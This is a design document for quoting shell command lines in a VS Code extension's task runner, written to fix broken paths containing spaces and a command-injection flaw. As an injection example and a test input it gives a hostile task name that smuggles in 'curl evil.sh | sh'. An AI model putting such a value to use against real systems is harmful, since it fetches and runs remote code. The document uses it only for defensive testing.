# Run command shell quoting — design

## Problem

`runCommand` in `src/core/package/exec-manager.ts` runs an Inspect/Scout task by
sending an unquoted command line to a reused VS Code integrated terminal:

```ts
terminal.sendText(`cd ${cwd}`);
terminal.sendText(cmd.join(" "));
```

The command line includes the workspace-relative task target
(`relativePath@target`), and user-entered `-T key=value` params — none quoted.

Two consequences:

- **Bug:** any path or value containing a space breaks the command (e.g. a
  workspace under `~/My Projects/` can't run tasks on macOS).
- **Security (command injection):** a file or task name like
  `task; curl evil.sh | sh.py` executes arbitrary shell when the user clicks Run.

A first attempt migrated this to the VS Code Tasks API (`ShellExecution` +
`ShellQuoting.Strong`). That fixed the quoting but **regressed Python
environment activation**: a Tasks-API task terminal does not run the Python
extension's environment activation hooks, so the bare `inspect` command (and the
selected interpreter) no longer resolve. The integrated terminal is therefore
required.

## Approach

Keep the auto-activated integrated terminal (preserving env activation) but
quote the command line correctly for the terminal's actual shell.

### New module: `src/core/shell-quote.ts` (pure, unit tested)

- `type ShellKind = "posix" | "powershell" | "cmd"`
- `detectShellKind(shellPath: string | undefined): ShellKind`
  - bash / zsh / sh / fish / git-bash → `posix`
  - pwsh / powershell → `powershell`
  - cmd → `cmd`
  - fallback: `posix` on non-win32, `powershell` on win32 (VS Code's modern
    default Windows profile)
- `quoteArg(value: string, kind: ShellKind): string`
  - **posix:** wrap in single quotes; escape embedded `'` as `'\''`. Nothing
    inside single quotes is interpreted, so this is bulletproof.
  - **powershell:** wrap in single quotes; escape embedded `'` by doubling
    (`''`). Single-quoted PowerShell strings are literal.
  - **cmd:** wrap in double quotes; escape `"` as `""`; caret-escape cmd
    metacharacters (`^ & | < > ( )`). Best-effort, but closes the common
    injection vectors.
- `quoteCommandLine(parts: string[], kind: ShellKind): string` — joins
  `quoteArg`-ed parts with single spaces.

### `exec-manager.ts` changes

- `buildRunCommand(profile, args, python)` returns the program + args as plain
  strings (`{ command: string; args: string[] }`): `python -m <packageName>`
  when a python path is supplied, otherwise the bare `profile.command`.
- `runCommand`:
  - Reuse a terminal named `profile.terminal` if present; otherwise
    `createTerminal({ name, cwd })` — the `cwd` option sets the directory
    natively (no shell parsing), so no `cd` is needed for new terminals.
  - For a **reused** terminal, send a quoted `cd <quoted cwd>` (the reused
    terminal may be in a different directory).
  - Determine `ShellKind` via `detectShellKind` from the terminal's
    `creationOptions.shellPath` (falling back to platform default).
  - Send `quoteCommandLine([command, ...args], kind)`.
- `runDebugger` is unchanged — it already passes `args` as an array to debugpy,
  which performs no shell interpretation.

### Tests

- `src/test/suite/shell-quote.test.ts` — per-kind quoting of: plain tokens,
  spaces, embedded quotes, and the hostile `task; curl evil.sh | sh` string;
  `detectShellKind` mapping and platform fallback.
- `src/test/suite/exec-manager.test.ts` — keep `buildRunCommand` tests, adapted
  to the string-returning shape (program selection + arg passthrough), with
  spacey/hostile inputs asserted to survive as single tokens after quoting.

## Out of scope

- The `shQuote` helper in `src/core/string.ts` (win32-only, used by
  `view-server.ts` `spawnProcess` with controlled inputs) — separate concern.
- A Windows CI leg — tracked separately in the backlog.
